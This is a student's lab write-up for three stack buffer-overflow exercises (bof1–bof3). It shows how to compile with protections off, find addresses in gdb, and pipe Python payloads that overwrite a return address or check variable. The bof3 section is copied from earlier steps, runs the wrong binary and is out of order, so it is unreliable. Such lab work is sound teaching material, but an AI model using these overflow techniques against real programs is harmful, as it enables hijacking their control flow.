## @author:Mai Đức Kiên
## @Id:22110046

## Exercise-Security Lab bof1
### Prepare for the lab environment:
The Dockerfile is used to build docker image with full required packages for Hands-On Assembly & Security labs. <br>
**How to use:**<br>
1. Install docker on your computer (host machine) <br>
2. Build the image "img4lab" that comprises all required packages for labs <br>
`$> docker build -t img4lab .` to build docker image <br>
3. Run docker container from previously built image <br> 
`$> docker run -it --privileged -v $HOME/Seclabs:/home/seed/seclabs img4lab` <br>
`Seclabs` is created inside student's home folder
### Visualize the initial attack idea
<img align="center" width=auto height=auto src="https://raw.githubusercontent.com/KITLoveWF/Exercise-Security/main/stackframe.png" /> <br>

### Conducting the attack
1. After creating the seclabs folder, continue to create a folder named bof in seclabs <br>
`$> mdkir bof` <br>
2. Open terminal<br>
`$> cd seclabs` <br>
`$> cd bof` <br>
3. Run code command. to open visual studio in terminal <br>
4. Run docker container from previously built image <br>
5. Run this command to create file bof1.out<br>
`$>gcc -g bof1.c -o bof1.out`<br>
6. Compile program with options to code execution on stack <br>
`$>gcc -g bof1.c -o bof1.out -fno-stack-protector -mpreferred-stack-boundary=2` <br>
7. Load vuln.out in gdb <br>
`$> gdb -q bof1.out` <br>
8. Get the secretFunc function address <br>
`$> disas secretFunc` <br>
<img align="center" width=auto height=auto src="https://raw.githubusercontent.com/KITLoveWF/Exercise-Security/main/secretFuncAddress.png" /> <br>
9. Once we have obtained the secretFunc function address: 0804846b, we must exit gdb <br>
`$> q` <br>
10. Overflow memory we need to fill 204 characters + 4 characters of secretFunc function address <br>
`$>echo $(python -c "print('a'*204+'\x6b\x84\x04\x08')") | ./bof1.out` <br>
<img align="center" width=auto height=auto src="https://raw.githubusercontent.com/KITLoveWF/Exercise-Security/main/result.png" /> <br>
11. Remove the missing arguments line, add the variables a,b,1,2,... to the end of bof1.out
`$> echo $(python -c "print('a'*204+'\x6b\x84\x04\x08')") | ./bof1.out 1` <br>
<img align="center" width=auto height=auto src="https://raw.githubusercontent.com/KITLoveWF/Exercise-Security/main/result1.png" /> <br>

## Exercise-Security Lab bof2
### Prepare for the lab environment:
The Dockerfile is used to build docker image with full required packages for Hands-On Assembly & Security labs. <br>
**How to use:**<br>
1. Install docker on your computer (host machine) <br>
2. Build the image "img4lab" that comprises all required packages for labs <br>
`$> docker build -t img4lab .` to build docker image <br>
3. Run docker container from previously built image <br> 
`$> docker run -it --privileged -v $HOME/Seclabs:/home/seed/seclabs img4lab` <br>
`Seclabs` is created inside student's home folder
### Visualize the initial attack idea
![image](https://github.com/user-attachments/assets/e77fc665-25ba-44a2-8082-b0075633236f)
### Conducting the attack
1. After creating the seclabs folder, continue to create a folder named bof in seclabs <br>
`$> mdkir bof` <br>
2. Open terminal<br>
`$> cd seclabs` <br>
`$> cd bof` <br>
3. Overflow memory we need to fill 40 characters + 4 characters of variable check address <br>
`$>echo $(python -c "print('a'*40+'\xff\xff\xff\xff')") | ./bof2.out` <br>
![image](https://github.com/user-attachments/assets/548b9b77-c695-48af-9e64-7334b3b7626d)
4. Else print out this statement printf("Yeah! You win!\n") <br>
`$>echo $(python -c "print('a'*40+'\xef\xbe\xad\xde')") | ./bof2.out` <br>
![image](https://github.com/user-attachments/assets/738be82f-7ceb-487d-9b3b-2a985bde5b0f)


## Exercise-Security Lab bof3
### Prepare for the lab environment:
The Dockerfile is used to build docker image with full required packages for Hands-On Assembly & Security labs. <br>
**How to use:**<br>
1. Install docker on your computer (host machine) <br>
2. Build the image "img4lab" that comprises all required packages for labs <br>
`$> docker build -t img4lab .` to build docker image <br>
3. Run docker container from previously built image <br> 
`$> docker run -it --privileged -v $HOME/Seclabs:/home/seed/seclabs img4lab` <br>
`Seclabs` is created inside student's home folder
### Visualize the initial attack idea
![image](https://github.com/user-attachments/assets/085fefae-1b34-4858-8c32-20a934d187a4)

### Conducting the attack
1. After creating the seclabs folder, continue to create a folder named bof in seclabs <br>
`$> mdkir bof` <br>
2. Open terminal<br>
`$> cd seclabs` <br>
`$> cd bof` <br>
4. Overflow memory we need to fill 40 characters + 4 characters of variable check address <br>
`$>echo $(python -c "print('a'*40+'\xff\xff\xff\xff')") | ./bof2.out` <br>
![image](https://github.com/user-attachments/assets/548b9b77-c695-48af-9e64-7334b3b7626d)
5. Run code command. to open visual studio in terminal <br>
6. Run docker container from previously built image <br>
7. Run this command to create file bof1.out<br>
`$>gcc -g bof3.c -o bof3.out`<br>
8. Compile program with options to code execution on stack <br>
`$>gcc -g bof3.c -o bof3.out -fno-stack-protector -mpreferred-stack-boundary=2` <br>
9. Load bof3.out in gdb <br>
`$> gdb -q bof3.out` <br>
10. Get the shell function address <br>
`$> disas shell` <br>
11. Else print out this statement printf("Yeah! You win!\n") <br>
`$>echo $(python -c "print('a'*40+'\xef\xbe\xad\xde')") | ./bof2.out` <br>
![image](https://github.com/user-attachments/assets/738be82f-7ceb-487d-9b3b-2a985bde5b0f)




   
